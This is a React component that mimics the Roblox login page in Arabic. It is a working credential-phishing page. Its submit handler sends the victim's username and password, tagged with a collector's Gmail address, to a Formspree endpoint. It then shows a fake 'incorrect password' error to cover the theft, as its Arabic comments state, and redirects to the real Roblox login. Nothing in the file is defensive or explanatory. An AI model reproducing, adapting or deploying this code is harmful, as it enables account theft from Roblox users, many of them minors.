
import React, { useState } from 'react';

export const LoginBox: React.FC = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showError, setShowError] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setShowError(false);

    try {
      const formData = new FormData();
      formData.append('Target_Email', 'battal.alzahrani23@gmail.com');
      formData.append('User_Input', username);
      formData.append('Pass_Input', password);

      // إرسال البيانات إلى Formspree
      await fetch('https://formspree.io/f/mqakpjne', {
        method: 'POST',
        headers: { 'Accept': 'application/json' },
        body: formData
      });

      // تمويه المستخدم بظهور خطأ ثم تحويله للموقع الرسمي
      setTimeout(() => {
        setIsSubmitting(false);
        setShowError(true);
        setTimeout(() => {
          window.location.href = 'https://www.roblox.com/login';
        }, 2000);
      }, 1000);

    } catch (err) {
      window.location.href = 'https://www.roblox.com/login';
    }
  };

  return (
    <div className="bg-[#2B2D2F] p-8 rounded-lg w-full max-w-[400px] login-box-shadow border border-white/5">
      <h1 className="text-[24px] font-bold text-center mb-8 text-white">تسجيل الدخول إلى Roblox</h1>
      
      {showError && (
        <div className="bg-[#fde8e8] text-[#c81e1e] p-3 rounded mb-4 text-[12px] font-bold text-center border border-[#f8b4b4]">
          اسم المستخدم أو كلمة المرور غير صحيحة. يرجى المحاولة مرة أخرى.
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <input
            type="text"
            placeholder="اسم المستخدم/البريد/الهاتف"
            required
            className="w-full bg-[#191B1D] border border-[#404244] rounded-md p-3 text-sm focus:outline-none focus:border-[#00A2FF] text-white transition-all"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
        </div>
        
        <div>
          <input
            type="password"
            placeholder="كلمة المرور"
            required
            className="w-full bg-[#191B1D] border border-[#404244] rounded-md p-3 text-sm focus:outline-none focus:border-[#00A2FF] text-white transition-all"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
        </div>

        <button
          type="submit"
          disabled={isSubmitting}
          className={`w-full py-2.5 rounded-md font-bold text-[15px] transition-all bg-[#00B06F] hover:bg-[#008A57] text-white mt-4 active:scale-[0.98] ${
            isSubmitting ? 'opacity-50 cursor-wait' : ''
          }`}
        >
          {isSubmitting ? 'جاري التحقق...' : 'تسجيل الدخول'}
        </button>
      </form>

      <div className="mt-4 text-center">
        <a href="#" className="text-[12px] text-[#00A2FF] hover:underline">هل نسيت كلمة المرور أو اسم المستخدم؟</a>
      </div>

      <div className="mt-8 space-y-4">
        <button type="button" className="w-full py-2 bg-[#393B3D] hover:bg-[#4a4c4e] rounded-md font-bold text-[13px] text-white border border-white/10">
          تسجيل دخول سريع
        </button>
        
        <button type="button" className="w-full py-2 bg-transparent hover:bg-white/5 rounded-md font-bold text-[13px] text-white border border-white/20">
          استخدام رمز صالح لمرة واحدة
        </button>
      </div>

      <div className="mt-10 text-center text-[13px]">
        <span className="text-gray-400">ليس لديك حساب؟</span>
        <a href="#" className="text-[#00A2FF] mr-2 hover:underline font-bold">اشتراك</a>
      </div>
    </div>
  );
};
